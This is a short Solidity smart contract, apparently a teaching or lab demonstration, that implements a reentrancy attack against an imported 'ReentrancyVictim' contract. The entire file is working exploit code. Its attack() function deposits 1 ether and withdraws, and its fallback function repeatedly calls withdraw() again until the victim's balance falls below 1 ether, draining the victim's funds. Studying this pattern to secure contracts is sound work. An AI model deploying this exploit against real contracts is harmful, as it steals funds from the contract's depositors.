// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
import "./ReentrancyVictim.sol";

contract Reentrancy{


    ReentrancyVictim public victim;
    address public owner;
    


    constructor( ReentrancyVictim _victim)payable{
        victim = ReentrancyVictim(_victim);
        owner = msg.sender;
    }

    fallback() external payable{
        if(address(victim).balance >= 1 ether){
            victim.withdraw();
        }
    }

  


    function attack() external payable{
        require(msg.value >= 1 ether);
        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }

       function getBalance() public view returns(uint256 bal){
      bal = address(this).balance;
    }
}